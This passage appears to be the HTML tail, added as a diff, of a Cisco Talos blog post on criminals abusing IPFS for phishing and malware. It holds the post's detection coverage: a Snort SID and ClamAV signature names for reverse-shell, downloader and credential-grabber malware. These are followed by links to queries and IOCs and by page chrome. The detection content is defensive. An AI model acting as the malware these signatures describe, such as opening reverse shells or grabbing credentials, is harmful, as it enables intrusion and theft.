href="https://signup.umbrella.com/?utm_medium=web-referral?utm_source=cisco&amp;utm_campaign=umbrella-free-trial&amp;utm_term=pgm-talos-trial&amp;utm_content=automated-free-trial">here</a>.</p><p><a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">Cisco Secure Web Appliance</a> (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. </p><p>Additional protections with context to your specific environment and threat data are available from the <a href="https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html">Firewall Management Center</a>.</p><p>Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on <a href="https://www.snort.org/products">Snort.org</a>. </p><p>The following Snort SIDs are applicable to this threat: 60728.</p><p>The following ClamAV signatures are applicable to this threat:</p><ul><li>Win.Trojan.AgentTesla-9974905-1</li><li>Pdf.Phishing.Agent-9974919-0</li><li>Txt.Malware.ArtifactDeletion-9974896-0</li><li>Win.Trojan.AgentTesla-9974906-0</li><li>Win.Downloader.ReverseShell-9974652-1</li><li>Win.Loader.Hannabi-9974435-0</li><li>Win.Trojan.Hannabi_Grabber-9974436-0</li><li>Py.Malware.ReverseShell-9974437-0</li></ul><h3 id="orbital-queries">Orbital Queries</h3><p>Cisco Secure Endpoint users can use <a href="https://orbital.amp.cisco.com/help/">Orbital Advanced Search</a> to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries on this threat, click <a href="https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_hannabi_file_artifact.yml">here</a></p><h1 id="indicators-of-compromise">Indicators of Compromise</h1><p>Indicators of Compromise associated with this threat can be found <a href="https://github.com/Cisco-Talos/IOCs/tree/main/2022/11">here</a>.</p><p><br></p><p><br></p><p><br></p><p><br></p><p><br></p>
+        </div>
+    </section>
+    <div class="social-media-wrapper">
+    <h5>Share this post</h5>
+    <ul class="social-media-share-list">
+        <li>
+            <a class="share-facebook" title="Share this on Facebook" data-text="Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns" data-href="https://blog.talosintelligence.com/ipfs-abuse/" rel="nofollow" target="_blank" href="https://www.facebook.com/sharer.php?u=https://blog.talosintelligence.com/ipfs-abuse/"></a>
+        </li>
+        <li>
+            <a class="share-twitter" title="Tweet This" data-text="Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns" data-href="https://blog.talosintelligence.com/ipfs-abuse/" rel="nofollow" target="_blank" href="https://twitter.com/share?url=https://blog.talosintelligence.com/ipfs-abuse/"></a>
+        </li>
+        <li>
+            <a class="share-linkedin" title="Share this on LinkedIn" data-text="Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns" data-href="https://blog.talosintelligence.com/ipfs-abuse/" rel="nofollow" target="_blank" href="https://www.linkedin.com/sharing/share-offsite/?url=https://blog.talosintelligence.com/ipfs-abuse/"></a>
+        </li>
+        <li>
+            <a class="share-reddit" title="Reddit This" data-text="Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns" data-href="https://blog.talosintelligence.com/ipfs-abuse/" rel="nofollow" target="_blank" href="https://www.reddit/submit?url=https://blog.talosintelligence.com/ipfs-abuse/"></a>
+        </li>
+        <li>
+            <a class="share-email" title="Email This" href="mailto:?body=Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaignshttps://blog.talosintelligence.com/ipfs-abuse/"></a>
+        </li>
+    </ul>
+</div></article>
+                </div>
+                <div class="col-lg alt-layout-row-dk sidebar" id="side-bar">
+
+
+                            <h4>Related Content</h4>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/intellexa-and-cytrox-intel-agency-grade-spyware/">
+                                        <h3>Intellexa and Cytrox: From fixer-upper to Intel Agency-grade spyware</h3>
+                                        <span  class="preview-attributes">December 21, 2023 11:00</span>
+                                        <p>Talos revealed that rebooting an iOS or Android device may not remove the Predator spyware produced by Intellexa. Intellexa knows if their customers intend to perform surveillance operations on foreign soil.</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/deep-dive-into-phobos-ransomware/">
+                                        <h3>A deep dive into Phobos ransomware, recently deployed by 8Base group</h3>
+                                        <span  class="preview-attributes">November 17, 2023 08:01</span>
+                                        <p>Cisco Talos has recently observed an increase in activity conducted by 8Base, a ransomware group that uses a variant of the Phobos ransomware and other publicly available tools to facilitate their operations.</p>
+                                    </a>
+                                </div>
+                                <div class="sidebar-snippet-wrapper">
+                                    <a href="/understanding-the-phobos-affiliate-structure/">
+                                        <h3>Understanding the Phobos affiliate structure and activity</h3>
+                                        <span  class="preview-attributes">November 17, 2023 08:01</span>
+                                        <p>Cisco Talos identified the most prolific Phobos variants, TTPs and affiliate structure, based on their activity and analysis of over 1,000 samples from VirusTotal dating back to 2019. We assess with moderate confidence Eking, Eight, Elbie, Devos and Faust are the most common variants</p>
+                                    </a>
+                                </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+
+    <footer id="footer">
+    <div class="container-fluid">
+        <div class="row footer_nav_wrapper">
+            <div class="col-lg-10 col-md-9 col-sm-12">
+                <div class="multi-col-list-wrapper">
+                    <ul>
+                        <li>
+                            <a href="https://talosintelligence.com/software">Software</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/reputation_center">Reputation Center</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/vulnerability_info">Vulnerability Information</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/ms_advisories">Microsoft Advisory Snort Rules</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/incident_response">Incident Response</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/amp-naming">Secure Endpoint Naming Conventions</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/talos_file_reputation">Talos File Reputation</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/community">Support Communities</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/about">About</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/careers">Careers</a>
+                        </li>
+                        <li>
+                            <a href="https://blog.talosintelligence.com">Talos Blog</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/newsletters">Threat Source Newsletter</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos Podcast</a>
+                        </li>
+                        <li>
+                            <a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes Podcast</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-lg-2 col-md-3 col-sm-12 connect_social">
+                <h5>Connect with us</h5>
+                <ul>
+                    <li>
+                        <a target="_blank" href="https://twitter.com/talossecurity" rel="nofollow">
+                            <img alt="Follow us on Twitter" src="https://blog.talosintelligence.com/assets/images/footer_icon_tw.svg?v=a225f65a71"/>
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured" rel="nofollow">
+                            <img alt="Watch our informational videos on YouTube" src="https://blog.talosintelligence.com/assets/images/footer_icon_yt.svg?v=a225f65a71"/>
+                        </a>
+                    </li>
+                    <li>
+                        <a target="_blank" href="https://www.linkedin.com/company/cisco-talos-intelligence-group/" rel="nofollow">
+                            <img alt="Connect with us on LinkedIn" src="https://blog.talosintelligence.com/assets/images/footer_icon_li.svg?v=a225f65a71">
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-sm-12 footer_corporate">
+                <a href="http://tools.cisco.com/security/center/home.x" target="_blank">
+                    <img src="https://blog.talosintelligence.com/assets/images/logo_cisco_white.svg?v=a225f65a71" alt="Cisco Security"/>
+                </a>
+
+                <p class="copyright">
+                    &copy; <span id="current-year"></span> Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our <a href="https://www.cisco.com/web/siteassets/legal/privacy_full.html" class="underline" target="_blank">Privacy Policy</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+    
+
+
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="https://blog.talosintelligence.com/assets/js/jquery-3.6.0.min.js?v=a225f65a71"></script>
+<script src="https://blog.talosintelligence.com/assets/js/popper.min.js?v=a225f65a71"></script>
+<script src="https://blog.talosintelligence.com/assets/js/bootstrap.bundle.min.js?v=a225f65a71"></script>
+<script src="https://blog.talosintelligence.com/assets/js/date.js?v=a225f65a71"></script>
+<script src="https://blog.talosintelligence.com/assets/js/prism.js?v=a225f65a71"></script>
+<script src="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/js/ghost-theme-utils.min.js" async defer></script>
+
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon='{"rayId":"83eaa0554e228938","b":1,"version":"2023.10.0","token":"35f8ae698f9d471b83b846a751388737"}' crossorigin="anonymous"></script>
+</body>
+
+</html>
